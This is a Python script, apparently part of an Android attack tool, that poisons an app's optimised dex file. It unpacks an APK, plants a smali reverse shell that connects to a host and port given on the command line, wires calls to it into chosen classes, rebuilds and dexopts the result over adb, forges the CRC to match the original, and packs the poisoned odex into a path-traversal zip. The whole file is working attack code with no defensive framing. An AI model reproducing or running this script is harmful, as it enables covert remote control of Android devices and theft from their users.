import sys
import tempfile

from poison_helper import *


# -------------------

def poison(apk, address, port, classes):
    apk = os.path.abspath(apk)
    unpacked_dir = tempfile.mkdtemp('odexpoison', 'kek')
    dist = unpacked_dir + '/dist/'
    print(unpacked_dir)

    # disassemble
    apktool_d(apk, unpacked_dir)

    # select highest smalli_sclasses\d+ dir
    hi_classes_no = apktool_find_hi_classes_no(unpacked_dir)
    hi_classes_path = unpacked_dir + '/smali_classes' + hi_classes_no

    # put reverse shell and trigger reverse shell from other files
    plant_smalish(address, port, hi_classes_path)
    plant_smalish_calls(hi_classes_path, classes)

    # assemble to get patched dex
    apktool_b(unpacked_dir)

    # unpack original apk, unpack patched apk, find patched dex
    packed_apk_name = os.listdir(dist)[0]
    unzip_dst = packed_apk_name.replace('.apk', '')
    unzip_orig_dst = packed_apk_name.replace('.apk', '') + "_orig"
    print("unzip %s to %s" % (packed_apk_name, unzip_dst))
    subprocess.check_output(['unzip', '-d', unzip_dst, packed_apk_name], cwd=dist)
    print("unzip %s to %s" % (apk, unzip_orig_dst))
    subprocess.check_output(['unzip', '-d', unzip_orig_dst, apk], cwd=dist)
    dexfilename = 'classes' + hi_classes_no + '.dex'
    odex = dist + '/' + unzip_dst + '/' + dexfilename.replace('dex', 'odex')
    dex = dist + '/' + unzip_dst + '/' + dexfilename
    dex_orig = dist + '/' + unzip_orig_dst + '/' + dexfilename
    
    # dexopt the patched dex file
    adb_push_dexoptwrapper()
    dexopt(dex, odex)

    # copy crc f
    fix_crc(dex_orig, odex)
    return [odex, unzip_dst, hi_classes_no]


if __name__ == "__main__":
    apk = sys.argv[1]
    host = sys.argv[2]
    port = sys.argv[3]
    classes = sys.argv[4].split(";")

    dirty_odex, app_id, n = poison(apk, host, port, classes)
    res = zip_odex_traversal(dirty_odex, app_id, n)

    print(dirty_odex, app_id, n)
    print(res)
